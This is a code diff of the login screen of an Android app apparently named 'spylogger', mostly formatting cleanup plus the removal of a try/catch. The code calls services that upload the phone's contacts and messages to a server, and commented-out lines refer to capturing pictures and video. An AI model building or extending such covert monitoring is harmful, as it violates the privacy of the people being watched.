@@ -36,11 +36,8 @@ import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
-import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
-import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
-import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
 import com.gravatasufoca.spylogger.services.SendContatosService;
 import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.services.SendUsuarioService;
@@ -110,8 +107,6 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         }
 
 
-
-
         if (!Utilidades.isConnected(this)) {
             Toast.makeText(this, R.string.nao_conectado, Toast.LENGTH_LONG).show();
             finish();
@@ -150,15 +145,8 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
 //                servicosHelper.getPicture(getApplicationContext(),true);
 //                servicosHelper.getVideo(getApplicationContext(),10,true);
 
-                try {
-                    RepositorioTopico repositorioTopico=new RepositorioTopicoImpl(getApplicationContext());
-                    List<Topico> topicos=repositorioTopico.listar();
-                    SendMensagensService sendMensagensService=new SendMensagensService(getApplicationContext(),null);
-                    sendMensagensService.enviarTopicos();
-
-                } catch (SQLException e) {
-                    Log.e("sql",e.getMessage());
-                }
+                SendMensagensService sendMensagensService = new SendMensagensService(getApplicationContext(), null);
+                sendMensagensService.enviarTopicos();
 
             }
         });
@@ -389,13 +377,13 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             // TODO: attempt authentication against a network service.
 
             try {
-                DatabaseHelper dbHelper=new DatabaseHelper(getApplicationContext());
+                DatabaseHelper dbHelper = new DatabaseHelper(getApplicationContext());
                 dbHelper.getWritableDatabase();
                 repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
 
                 configuracao = repositorioConfiguracao.getConfiguracao();
 
-                if(configuracao==null){
+                if (configuracao == null) {
                     dbHelper.criarConfiguracaoPadrao();
                     configuracao = repositorioConfiguracao.getConfiguracao();
                 }
@@ -448,9 +436,9 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             if (success) {
                 // finish();
             } else {
-                if(configuracao==null){
+                if (configuracao == null) {
                     mEmailView.setError(getString(R.string.com_error));
-                }else {
+                } else {
                     mPasswordView.setError(getString(R.string.error_incorrect_password));
                     mPasswordView.requestFocus();
                 }
@@ -480,7 +468,7 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
                         break;
                     case 200:
                         UsuarioVO usuarioVO = (UsuarioVO) msg.obj;
-                        if(usuarioVO!=null && usuarioVO.getAparelho()!=null && usuarioVO.getAparelho().getId()!=null) {
+                        if (usuarioVO != null && usuarioVO.getAparelho() != null && usuarioVO.getAparelho().getId() != null) {
                             configuracao.setIdAparelho(usuarioVO.getAparelho().getId());
                             try {
                                 repositorioConfiguracao.atualizar(configuracao);
@@ -489,10 +477,10 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
                                 Log.e("sql", e.getMessage());
                             }
                         }
-                        SendContatosService sendContatosService=new SendContatosService(getApplication(),null);
+                        SendContatosService sendContatosService = new SendContatosService(getApplication(), null);
                         sendContatosService.enviarContatos();
 
-                        Utils.startNewService(context,configuracao);
+                        Utils.startNewService(context, configuracao);
 //                        finish();
                         break;
                     default:
